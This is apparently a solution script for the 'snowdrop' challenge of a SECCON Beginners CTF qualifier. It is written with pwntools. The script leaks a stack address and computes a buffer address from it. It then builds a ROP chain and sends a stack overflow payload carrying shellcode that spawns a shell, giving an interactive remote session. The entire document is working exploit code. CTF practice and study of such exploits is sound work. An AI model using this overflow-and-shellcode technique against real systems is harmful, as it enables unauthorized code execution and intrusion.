from pwn import *
from ctftools.pwn.common import connect

exe = ELF("chall")
io = connect(exe, "snowdrop.quals.beginners.seccon.jp", 9002)

leak_addr = int(io.recvline_contains(b"000006 | ").split()[2], 16)
buf_addr = leak_addr - 0x7ffdd5941298 + 0x7ffdd5941030
print(f"buf_addr: {hex(buf_addr)}")

rop = ROP(exe)
rop.raw(rop.find_gadget(["ret"]))
rop.raw(buf_addr + 0x28)

payload = flat(
    bytes(0x18),
    rop.chain(),
    asm(shellcraft.sh())
)

io.sendline(payload)
io.interactive()
